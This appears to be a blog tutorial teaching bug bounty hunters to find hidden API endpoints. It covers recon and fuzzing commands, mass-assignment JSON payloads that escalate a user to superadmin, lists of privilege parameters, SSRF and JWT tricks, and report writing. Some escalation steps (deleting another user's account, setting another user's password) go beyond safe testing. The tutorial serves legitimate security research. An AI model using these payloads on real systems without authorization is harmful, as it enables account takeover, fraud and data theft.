# API Bug Bounty Mastery 2026: Hunt Hidden Endpoints to Land $10k+ Payouts

**Published:** 2026-02-19


## A Step‑by‑Step Methodology — From Passive Recon & JavaScript Leakage to Mass Assignment, BOLA Chains, and Critical Privilege Escalation


![Image](https://miro.medium.com/v2/resize:fit:367/1*KrIJW2oOjRq8Gz3bp6Q_Sg.jpeg)

*mass assignment go brrr*

APIs power ~85%+ of modern web & mobile traffic in 2026. Most bug-bounty payouts above $5,000–$30,000 come from APIs — not reflected XSS in contact forms. Why? APIs expose business logic directly, often with weak authorization, hidden endpoints, and mass-assignment blind spots.

**Goal of this write-up**: Give you a realistic, step-by-step methodology to go from zero knowledge of a target’s APIs → discovering undocumented/shadow endpoints → chaining into high-impact bugs (BOLA/IDOR, Broken Auth, Mass Assignment, Excessive Data Exposure, etc.).

### Phase 0 — Preparation & Legal Framing (Mandatory)

*   Confirm **in-scope** targets (main domain + \*.target.com usually includes APIs)
*   Read program rules: rate-limit allowances, no DoS, no mass account creation
*   Set up proxy: Burp Suite / mitmproxy / ZAP + scope filtering
*   Create workspace: mkdir -p target/{js,urls,api\_endpoints,burp,reports}

### Phase 1 — Passive + Semi-Passive Recon (Build the API Surface Map)

Goal: Collect every possible endpoint without touching the target heavily.

**1\. Historical URLs** (most shadow APIs live here)

waymore -i target.com -mode U -oU wayurls.txt  
  
echo "target.com" | gau --threads 10 --subs | anew gauurls.txt  
  
cat wayurls.txt gauurls.txt | uro | sort -u > waygauurls.txt

**2\. JS / Frontend Leakage** (highest ROI for hidden endpoints)

*   Crawl deeply → katana / hakrawler / gospider / [extracturls.sh](https://github.com/manojxshrestha/scripts/blob/main/extracturls.sh)

cat https-subs.txt | katana -d 5 -jc -timeout 15 -c 20 | anew cleansubskatanaurls.txt  
  
cat https-subs.txt | hakrawler -subs -u -d 3 > hakcrawlurls.txt  
  
gospider -S https-subs.txt -o gooutput -c 10 -d 3 -t 20  
  
./extracturls.sh -f <gospider\_output\_folder> -d <target\_domain>  
  
cat waygauurls.txt cleansubskatanaurls.txt hakcrawlurls.txt | uro > katanaurls.txt  
  
cat alivesubsurls.txt katanaurls.txt | sort -u | anew tempcrawled.txt  
  
uro -i tempcrawled.txt -o crawledurls.txt

*   Extract endpoints & params

cat crawledurls.txt | xargs -I@ curl -s @ | grep -oE "(\['\\"\])/(api|rest|graphql|v\[1-9\]|internal|private|admin|debug|beta|mobile|app)\[a-zA-Z0-9\_/-\]\*\\1" | tr -d "'\\"" | anew js-endpoints.txt

*   Parse **source maps** (.js.map) — often reveal clean paths

cat crawledurls.txt | grep '\\.map$' | xargs -I@ wget -q @ -O - | sourcemapper map - | grep -E '/api/|/v\[0-9\]/' | anew sourcemap-paths.txt

*   Use **LinkFinder** or Burp JS Miner extension for better results.

**3\. Known Docs Leaks** (Swagger, Redoc, etc.)

ffuf -u https://api.target.com/FUZZ -w /home/pwn/wordlists/swagger-wordlist.txt -mc 200 -ac -o swagger.txt  
jq -r '.results\[\].url' swagger.txt > swagger-urls.txt  
\# Common paths: swagger.json, openapi.json, api-docs, /docs, /redoc, /rapidoc

### Phase 2 — Active Enumeration (Discover Hidden / Shadow Endpoints)

Goal: Find undocumented, internal, debug, admin, legacy, versioned endpoints.

**1\. Smart API Route Brute-forcing** — **Kiterunner**

kr scan https://api.target.com -w /home/pwn/wordlists/routes-large.kite --delay 200ms -t 20s -x 4 -j 1 --max-redirects 5 --wildcard-detection=false --quarantine-threshold 0 --fail-status-codes 403,429,500,502,503 --ignore-length 0-500 --ignore-length 10000-50000 --progress --verbose info -o pretty | tee kr-hidden.txt

**2\. Classic but Targeted Fuzzing**

ffuf -u https://api.target.com/FUZZ -w /home/pwn/wordlists/httparchive\_apiroutes\_2026\_01\_27.txt -mc 200,201,204,301,302,401,403 -ac -t 40 | tee ffuf-hidden.txt

**3\. Version / Prefix Variation** Common pattern: /api/v1/public exists → try /api/v2, /api/internal, /api/private/v1, /api/beta

**4\. Method Variation** (many POST-only endpoints accept GET with leak)

cat crawledurls.txt | grep \-E \-i '(api|rest|graphql|v1|v2|v3|json|ajax|endpoint|internal|private|admin|auth|user|login|logout|token|session|sso|oauth|mobile|app|backend|/api/|/v\[0\-9\]/)' | grep \-E \-v \-i '(login|signin|signup|register|logout|forgot|reset|password|static|assets|css|js|jpg|png|gif|svg|woff|ttf|map|jquery|bootstrap|font)' \> api\-candidates.txt  
  
cat api\-candidates.txt | xargs \-I@ bash \-c 'for m in GET POST PUT DELETE PATCH OPTIONS; do curl \-s \-X $m \-o /dev/null \-w "%{http\_code} $m @\\n" @; done' | grep \-v "404\\|405" | anew method\-variations.txt

**5\. No-Auth / Low-Auth Endpoints** (frequent high-severity bugs)

cat api-candidates.txt | httpx -silent -mc 200 -fc 401,403 | anew noauth-endpoints.txt

### Phase 3 — Parameter Discovery (The Real Money Is Here)

Hidden parameters are gold — they bypass front-end validation.

**1\. Arjun** — still excellent

arjun \-u https://api.target.com/user/update \-m POST \--stable -oT arjun-params.txt

**2\. ParamSpider / x8 / ffuf parameter fuzz**

ffuf -u https://api.target.com/user?FUZZ=test -w /home/pwn/wordlists/burp-parameter-names.txt -mc 200,301 -ac -t 50 | tee ffuf-param.txt

2026 hot hidden params to add:

debug\=1  
internal\=true  
bypass\=true  
godmode\=1  
is\_admin\=true  
role\=admin  
impersonate\_user\_id\=123  
override\=true  
sudo\=1  
test\=true

**3\. Mass Assignment / Extra Fields**

1\. Identify Candidate Endpoints (Where Mass Assignment Usually Hides)

Focus on endpoints that **create** or **update** user-controlled objects — these are most likely to be vulnerable.

Common high-value endpoints:

*   POST /api/register / POST /api/signup / POST /api/auth/register (registration — highest success rate)
*   PATCH /api/profile / PUT /api/user / POST /api/user/update / PUT /api/me / PATCH /api/account (profile/self-update)
*   POST /api/teams / POST /api/organizations / POST /api/groups (creation of owned entities)
*   POST /api/subscription / POST /api/billing/plan (payment/upgrade flows)
*   POST /api/redeem / POST /api/coupon/apply (business logic flows)

How to find them:

*   From JS files: grep for strings like update, profile, me, register, signup
*   From historical/crawled URLs: filter for POST/PATCH/PUT methods with JSON content-type
*   From Swagger/OpenAPI if leaked
*   Burp history / Repeater targets after normal app usage

**2\. Capture a Normal / Legitimate Request (Baseline)**

Use Burp Suite (Proxy + Repeater), mitmproxy, or curl while using the app normally.

Example scenario: Updating your own profile (very common vuln location)

**Normal request captured** (what the frontend actually sends):

**Request**:

PATCH /api/v1/profile HTTP/1.1  
Host: api.target.com  
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  
Content-Type: application/json  
Content-Length: 78  
  
{  
  "bio": "I like hacking APIs",  
  "avatar\_url": "https://example.com/myphoto.jpg",  
  "phone": "+1-555-123-4567",  
  "preferred\_language": "en"  
}

**Response** (200 OK, success):

{  
  "status": "success",  
  "user": {  
    "id": 12345,  
    "email": "you@target.com",  
    "bio": "I like hacking APIs",  
    "avatar\_url": "https://example.com/myphoto.jpg",  
    "phone": "+1-555-123-4567",  
    "preferred\_language": "en",  
    "role": "user",           // ← this field exists but frontend never lets you change it  
    "is\_verified": true  
  }  
}

Key observations:

*   The backend returns more fields than you sent (role, is\_verified, etc.)
*   This hints the endpoint maps the body → a User object → saves → returns the object

**3\. Add Extra / Sensitive Fields (The Injection)**

Copy the request to **Repeater** (or new curl tab).

**Modified request** — append your mass assignment payload at the end of the JSON object:

{  
  "bio": "I like hacking APIs",  
  "avatar\_url": "https://example.com/myphoto.jpg",  
  "phone": "+1-555-123-4567",  
  "preferred\_language": "en",  
  "is\_admin": true,  
  "role": "superadmin",  
  "access\_level": 999,  
  "admin": 1,  
  "privilege": "god",  
  "is\_superadmin": true,  
  "permissions": \["admin", "delete\_users", "view\_all\_data"\]  
}

**Important variations to try** (bypass weak filters):

*   Capitalization tricks: “IsAdmin”: true, “ROLE”: “ADMIN”, “isAdmin”: “true”
*   Nested objects: “permissions”: { “admin”: true }, “role”: { “name”: “admin” }
*   Numeric: “role”: 1, “access\_level”: “9999”
*   Array: “roles”: \[“user”, “admin”, “superadmin”\]
*   Boolean as string/number: “is\_admin”: “1”, “is\_admin”: 1

Send the request.

**4\. Observe & Confirm the Vulnerability**

Look for these signs of success:

*   **HTTP status** = 200/201/204 (no 400/422 “unknown field” error)
*   **Response body** echoes back your injected value:

{  
  "user": {  
    ...,  
    "role": "superadmin",          ← jackpot  
    "is\_admin": true,  
    "access\_level": 999  
  }  
}

*   **Silent success** (most common): response looks normal, but privileges changed
*   Log out → log in again
*   Visit protected endpoints: /api/admin/users, /api/dashboard/stats, /api/delete-account (try deleting someone else’s account)
*   Check UI: new admin menu appears? Can list all users? Can impersonate others?
*   Re-fetch your profile: GET /api/v1/profile or GET /api/me → see if role changed

If nothing visible → try other actions:

*   Create new resource (e.g. team/project) with injected fields
*   Check audit logs / other users’ data if you can now access them

**5\. Escalate Impact (Prove Business Harm)**

*   **Privilege escalation**: normal user → admin/superadmin
*   **Account takeover**: set “password”: “hacked123” on another user’s profile if IDOR + mass assignment
*   **Data manipulation**: set “balance”: 999999 in billing endpoint
*   **Feature bypass**: “is\_premium”: true, “subscription\_status”: “lifetime”
*   **Mass impact**: register 10 accounts with “role”: “admin” → instant admin army

### Phase 4 — Vulnerability Testing (OWASP API Top 10 2023 Focus — Still King in 2026)

> **_API1 — Broken Object Level Auth (BOLA / IDOR)_**_  
> Swap IDs (_`_user/123 → user/456_`_) → Check access to other users’ data._
> 
> **_API2 — Broken Authentication_**_JWT_ `_none_` _alg, weak secret, token reuse, header spoofing (_`_X-Forwarded-*_`_)._
> 
> **_API3 — Broken Object Property Auth_**_  
> Extra sensitive fields returned? (_`_email_`_,_ `_ssn_` _in_ `_/profile_`_)._
> 
> **_API4 — Unrestricted Resource Consumption_**`_100000_` _items/page, heavy GraphQL queries, no rate limiting._
> 
> **_API5 — Broken Function Level Auth_**_Normal user calling_ `_/admin/delete-user_`_._
> 
> **_API6 — Unrestricted Access to Sensitive Business Flows_**_  
> Coupon spam, vote manipulation, race conditions._
> 
> **_API7 — Server Side Request Forgery (SSRF)_**`_webhook?url=169.254.169.254_`_, internal port probing._
> 
> **_API8 — Security Misconfiguration_**_Exposed actuators,_ `_debug=true_`_,_ `_CORS *_`_, verbose error messages._
> 
> **_API9 — Improper Inventory Management_**_  
> Zombie endpoints (old versions still alive)._
> 
> **_API10 — Unsafe Consumption of APIs_**_  
> SSRF via 3rd-party API calls, injection in forwarded user input._

**High-payout chains in 2026**:

*   Hidden admin endpoint (no auth) → mass assignment → become admin → account takeover
*   Shadow /v2 endpoint → BOLA + excessive data → leak PII of all users
*   Debug param → verbose errors → leak internal endpoints → SSRF → metadata

### Phase 5 — GraphQL Specifics (Very Common in 2026)

1\. Find endpoint: /graphql, /api/graphql, /gql

2\. Introspection (even partial):

curl -X POST -H "Content-Type: application/json" --data '{"query":"{\_\_schema{types{name}}}"}' https://target.com/graphql

3\. If blocked → use [**Clairvoyance**](https://github.com/nikitastupin/clairvoyance) or brute fields with [**graphql-path-enum**](https://github.com/nikitastupin/clairvoyance)

4\. Batch heavy queries to bypass limits

5\. Look for \_\_typename, fragments to leak schema

### Phase 6 — Automation & Validation

*   **Nuclei** API templates

nuclei -l kr-hidden.txt -t http/api/ -severity medium,high,critical -o api-nuc.txt  
  
nuclei -l noauth-endpoints.txt -t http/api/ -severity medium,high,critical -o api-nuc.txt  
  
nuclei -l js-endpoints.txt-t http/api/ -severity medium,high,critical -o api-nuc.txt

*   Manual PoC in Burp Repeater → document steps, impact
*   Screenshot everything

### Phase 7 — Reporting (Make It Pay)

Structure:

1.  Title: \[Critical\] Undocumented Admin API Allows Mass Assignment → Full Account Takeover
2.  Steps to Reproduce (numbered, with requests/responses)
3.  Impact: Business logic bypass → privilege escalation → data theft/RCE potential
4.  Root cause: Hidden endpoint + no server-side auth check
5.  Recommendation: Remove/deprecate shadow endpoints, enforce strict allow-lists
6.  Screenshots + video if >$10k potential

**Realistic bounties**:

*   Hidden endpoint + BOLA → $4k–$12k
*   Admin bypass via mass assignment → $10k–$30k+
*   PII leak via shadow API → $8k–$25k

### Final Tips

*   **Focus on business logic** > automated scanners
*   **Chain small issues** (403 endpoint + param fuzz → 200 takeover)
*   **Update wordlists** monthly (SecLists + custom from previous hunts)
*   **Practice on**: vAPI, crAPI, Damn Vulnerable API, public programs (HackerOne disclosed reports)
*   **Stay ethical** — only in-scope, no destructive testing

This methodology turns API hunting from “spray Nuclei” into targeted, high-reward work. Start small (one subdomain), master JS → endpoint extraction, then fuzz parameters/methods — that’s where 70%+ of big API bugs hide.

Good luck hunting — drop your first API bug report in the comments when you land it!